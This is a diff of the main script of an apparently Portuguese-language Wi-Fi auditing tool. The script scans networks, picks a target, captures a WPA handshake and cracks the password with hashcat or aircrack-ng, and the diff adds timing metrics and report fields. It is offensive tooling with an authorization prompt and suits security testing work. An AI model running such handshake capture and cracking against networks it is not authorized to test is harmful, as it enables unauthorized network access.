@@ -1,6 +1,7 @@
 import argparse
 import logging
 import sys
+import time
 from dataclasses import asdict
 
 from interface import enable_monitor_mode, disable_monitor_mode, check_dependencies
@@ -30,7 +31,6 @@ def parse_args() -> argparse.Namespace:
 
 
 def select_target(networks):
-    """Prompts the user to pick a network by index, with proper bounds checking."""
     print("\n" + "=" * 40)
     print(" SELECIONE O ALVO ")
     print("=" * 40)
@@ -63,7 +63,9 @@ def main() -> None:
         logger.info("Interface %s pronta para operação.", monitor_interface)
 
         logger.info("Iniciando scan de redes por %s segundos...", args.scan_time)
+        scan_start = time.time()
         networks = scan_networks(monitor_interface, args.scan_time)
+        scan_duration_s = time.time() - scan_start
         display_networks(networks)
 
         if not networks:
@@ -78,40 +80,64 @@ def main() -> None:
             logger.warning("Autorização negada pelo usuário. Abortando.")
             return
 
-        cap_file = f"capture_{target.bssid.replace(':', '_')}.cap"
-        logger.info("Iniciando captura em %s... Aguardando handshake.", cap_file)
+        cap_prefix = f"capture_{target.bssid.replace(':', '_')}"
+        logger.info("Iniciando captura para %s... Aguardando handshake.", cap_prefix)
 
-        start_capture(monitor_interface, target.bssid, target.channel, cap_file)
+        capture_start = time.time()
+      
+        cap_file = start_capture(monitor_interface, target.bssid, target.channel, cap_prefix)
 
-        success = wait_for_handshake(cap_file, args.handshake_timeout)
-        if not success:
+        handshake_captured = wait_for_handshake(cap_file, args.handshake_timeout)
+        capture_duration_s = time.time() - capture_start
+
+        if not handshake_captured:
             logger.error("Handshake não capturado dentro do tempo limite.")
+            report = build_report(
+                target_essid=target.essid,
+                target_bssid=target.bssid,
+                scan_duration_s=scan_duration_s,
+                capture_duration_s=capture_duration_s,
+                crack_duration_s=0.0,
+                handshake_captured=False,
+                password_found=False,
+                password=None,
+                attempts_per_second=None,
+            )
+            save_json(report, args.output)
+            save_html(report, args.output.replace(".json", ".html"))
+            logger.info("Relatório parcial gerado em %s", args.output)
             return
 
-        password = None
+        crack_start = time.time()
         if args.engine == "hashcat":
             logger.info("Convertendo formato para hashcat (.hc22000)...")
-            hc_file = convert_to_hashcat_format(cap_file)
-            password = crack_with_hashcat(hc_file, args.wordlist)
+            hc_file = convert_to_hashcat_format(cap_file, cap_file.replace(".cap", ".hc22000"))
+            logger.info("Iniciando cracking com hashcat...")
+            crack_result = crack_with_hashcat(hc_file, args.wordlist)
         else:
             logger.info("Iniciando cracking com aircrack-ng...")
-            password = crack_with_aircrack(cap_file, args.wordlist)
+            crack_result = crack_with_aircrack(cap_file, args.wordlist, target.bssid)
+        crack_duration_s = time.time() - crack_start
 
-        report_data = {
-            "target": asdict(target),
-            "interface": monitor_interface,
-            "engine": args.engine,
-            "password": password if password else "Não encontrada",
-            "status": "Sucesso" if password else "Falha",
-        }
-
-        report = build_report(report_data)
+        report = build_report(
+            target_essid=target.essid,
+            target_bssid=target.bssid,
+            scan_duration_s=scan_duration_s,
+            capture_duration_s=capture_duration_s,
+            crack_duration_s=crack_duration_s,
+            handshake_captured=True,
+            password_found=crack_result["success"],
+            password=crack_result["password"],
+            attempts_per_second=crack_result.get("attempts_per_second"),
+        )
         save_json(report, args.output)
         save_html(report, args.output.replace(".json", ".html"))
 
         logger.info("Relatório gerado com sucesso em %s", args.output)
-        if password:
-            logger.info("SENHA ENCONTRADA: %s", password)
+        if crack_result["success"]:
+            logger.info("SENHA ENCONTRADA: %s", crack_result["password"])
+        else:
+            logger.warning("Senha não encontrada na wordlist fornecida.")
 
     except Exception:
         logger.exception("Ocorreu um erro crítico durante a execução.")
